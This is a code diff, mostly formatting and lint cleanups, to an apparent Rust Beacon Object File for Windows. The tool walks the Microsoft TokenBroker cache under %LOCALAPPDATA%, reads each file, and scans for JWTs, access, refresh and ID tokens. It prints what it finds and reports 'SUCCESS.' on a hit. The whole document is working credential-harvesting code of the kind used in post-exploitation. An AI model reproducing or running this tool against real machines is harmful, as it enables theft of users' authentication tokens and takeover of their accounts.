@@ -13,23 +13,17 @@
 
 use alloc::vec;
 use rustbof::{eprintln, println};
-use windows_sys::Win32::Foundation::{
-    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, ERROR_NO_MORE_FILES,
-};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
 use windows_sys::Win32::Storage::FileSystem::*;
 
 unsafe extern "system" {
-    fn ExpandEnvironmentStringsA(
-        src: *const u8,
-        dst: *mut u8,
-        size: u32,
-    ) -> u32;
+    fn ExpandEnvironmentStringsA(src: *const u8, dst: *mut u8, size: u32) -> u32;
 }
 
 const MAX_FILE_SIZE: usize = 1024 * 1024;
 
 const TOKEN_PATTERNS: &[&[u8]] = &[
-    b"eyJ",           // JWT prefix (base64 JSON)
+    b"eyJ", // JWT prefix (base64 JSON)
     b"access_token",
     b"refresh_token",
     b"id_token",
@@ -63,7 +57,7 @@ fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
 
         let mut size_high: u32 = 0;
         let size_low = GetFileSize(handle, &mut size_high);
-        let file_size = ((size_high as u64) << 32 | size_low as u64) as usize;
+        let file_size = (((size_high as u64) << 32) | size_low as u64) as usize;
 
         if file_size == 0 || file_size > MAX_FILE_SIZE {
             CloseHandle(handle);
@@ -105,7 +99,7 @@ fn search_tokens(data: &[u8], filename: &str) -> usize {
                 let snippet = &data[start..end];
                 let display: alloc::vec::Vec<u8> = snippet
                     .iter()
-                    .map(|&b| if b >= 0x20 && b < 0x7f { b } else { b'.' })
+                    .map(|&b| if (0x20..0x7f).contains(&b) { b } else { b'.' })
                     .collect();
                 if let Ok(s) = core::str::from_utf8(&display) {
                     let pat_str = core::str::from_utf8(pattern).unwrap_or("?");
@@ -128,11 +122,18 @@ fn main(_args: *mut u8, _len: usize) {
     let env_path = b"%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*\0";
     let mut expanded = [0u8; 512];
     let result = unsafe {
-        ExpandEnvironmentStringsA(env_path.as_ptr(), expanded.as_mut_ptr(), expanded.len() as u32)
+        ExpandEnvironmentStringsA(
+            env_path.as_ptr(),
+            expanded.as_mut_ptr(),
+            expanded.len() as u32,
+        )
     };
 
     if result == 0 {
-        eprintln!("Failed to expand environment string (error {:#X})", unsafe { GetLastError() });
+        eprintln!(
+            "Failed to expand environment string (error {:#X})",
+            unsafe { GetLastError() }
+        );
         return;
     }
 
@@ -166,7 +167,7 @@ fn main(_args: *mut u8, _len: usize) {
                 let mut full_path = alloc::string::String::from(dir_prefix);
                 full_path.push_str(name);
 
-                let file_size = (fd.nFileSizeHigh as u64) << 32 | fd.nFileSizeLow as u64;
+                let file_size = ((fd.nFileSizeHigh as u64) << 32) | fd.nFileSizeLow as u64;
                 println!("  File: {} ({} bytes)", name, file_size);
 
                 if let Some(data) = read_file_contents(&full_path) {
@@ -174,14 +175,18 @@ fn main(_args: *mut u8, _len: usize) {
                     total_found += found;
 
                     if data.len() <= 4096 && found == 0 {
-                        let printable = data.iter().filter(|&&b| b >= 0x20 && b < 0x7f).count();
+                        let printable = data.iter().filter(|&&b| (0x20..0x7f).contains(&b)).count();
                         if printable > data.len() / 2 {
                             let display: alloc::vec::Vec<u8> = data
                                 .iter()
-                                .map(|&b| if b >= 0x20 && b < 0x7f { b } else { b'.' })
+                                .map(|&b| if (0x20..0x7f).contains(&b) { b } else { b'.' })
                                 .collect();
                             if let Ok(s) = core::str::from_utf8(&display) {
-                                println!("  [{}] content: {}", name, &s[..core::cmp::min(s.len(), 256)]);
+                                println!(
+                                    "  [{}] content: {}",
+                                    name,
+                                    &s[..core::cmp::min(s.len(), 256)]
+                                );
                             }
                         }
                     }
@@ -196,7 +201,10 @@ fn main(_args: *mut u8, _len: usize) {
 
         FindClose(handle);
 
-        println!("Checked {} cache files, found {} token artifact(s)", files_checked, total_found);
+        println!(
+            "Checked {} cache files, found {} token artifact(s)",
+            files_checked, total_found
+        );
         if total_found > 0 {
             println!("SUCCESS.");
         } else {
